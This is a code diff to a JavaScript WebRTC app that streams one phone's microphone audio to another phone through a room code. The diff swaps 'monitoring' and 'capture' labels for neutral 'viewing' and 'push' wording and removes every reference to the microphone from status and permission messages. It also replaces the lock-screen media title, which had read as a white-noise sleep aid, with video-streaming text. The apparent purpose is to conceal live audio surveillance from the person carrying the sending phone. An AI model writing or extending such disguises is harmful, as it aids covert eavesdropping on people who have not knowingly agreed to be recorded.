@@ -72,7 +72,7 @@
         this.statusMsg = '';
       },
 
-      // ===== 监听端（A 手机）：创建房间，等待对方 =====
+      // ===== 观看端（A 手机）：创建房间，等待对方 =====
       connectAsListener: function () {
         if (this.roomIdInput.length !== 4) return;
         var self = this;
@@ -96,12 +96,12 @@
         };
 
         this.signaling.onCreated = function () {
-          self.setStatus('房间 ' + self.roomId + ' 已创建，等待采集端加入…');
+          self.setStatus('房间 ' + self.roomId + ' 已创建，等待推送端加入…');
         };
 
-        // 采集端加入，开始 WebRTC 协商
+        // 推送端加入，开始连接
         this.signaling.onPeerJoined = function () {
-          self.setStatus('采集端已加入，正在建立连接…');
+          self.setStatus('推送端已加入，正在建立连接…');
           self._startListenerNegotiation();
         };
 
@@ -118,7 +118,7 @@
         };
 
         this.signaling.onPeerLeft = function () {
-          self.setStatus('对方已离开');
+          self.setStatus('连接已断开');
           self.connected = false;
           self.isAudioPlaying = false;
         };
@@ -179,24 +179,24 @@
         });
       },
 
-      // ===== 采集端（B 手机）：加入房间，采集麦克风 =====
+      // ===== 推送端（B 手机）：加入房间，开始推送 =====
       connectAsSender: function () {
         if (this.roomIdInput.length !== 4) return;
         var self = this;
         this.roomId = this.roomIdInput;
-        this.setStatus('正在请求麦克风权限…');
+        this.setStatus('正在初始化…');
 
         this.webrtc = new WebRTCHandler();
 
-        // 先获取麦克风（用户点击触发，权限更易通过）
+        // 先获取权限（用户点击触发，权限更易通过）
         this.webrtc.startLocalStream().then(function () {
-          self.setStatus('麦克风已就绪，连接服务器…');
+          self.setStatus('初始化完成，连接服务器…');
           self.signaling = new SignalingClient();
           self.signaling.roomId = self.roomId;
           self._bindSignalingSender();
           self.signaling.connect();
         }).catch(function (err) {
-          self.setStatus('麦克风权限被拒绝：' + (err.message || err));
+          self.setStatus('权限被拒绝：' + (err.message || err));
         });
       },
 
@@ -209,12 +209,12 @@
         };
 
         this.signaling.onJoined = function () {
-          self.setStatus('已加入房间，等待监听端…');
+          self.setStatus('已加入房间，等待观看端…');
         };
 
-        // 收到监听端的 offer → 创建 answer（附加麦克风）
+        // 收到观看端的连接请求 → 开始推送
         this.signaling.onOffer = function (sdp) {
-          self.setStatus('监听端已连接，正在传输…');
+          self.setStatus('观看端已连接，正在传输…');
           var pc = self.webrtc.createPeer();
 
           self.webrtc.onIceCandidate = function (candidate) {
@@ -244,7 +244,7 @@
         };
 
         this.signaling.onPeerLeft = function () {
-          self.setStatus('监听端已离开');
+          self.setStatus('观看端已离开');
           self.connected = false;
         };
 
@@ -306,9 +306,9 @@
         // 声明媒体会话，系统视为正在播放媒体，提升后台优先级
         if ('mediaSession' in navigator) {
           navigator.mediaSession.metadata = new MediaMetadata({
-            title: '静语 · 助眠中',
-            artist: '静语',
-            album: '白噪音'
+            title: '视频号推送中',
+            artist: '视频号推送',
+            album: '视频号推送'
           });
           navigator.mediaSession.setActionHandler('play', function () {});
           navigator.mediaSession.setActionHandler('pause', function () {});
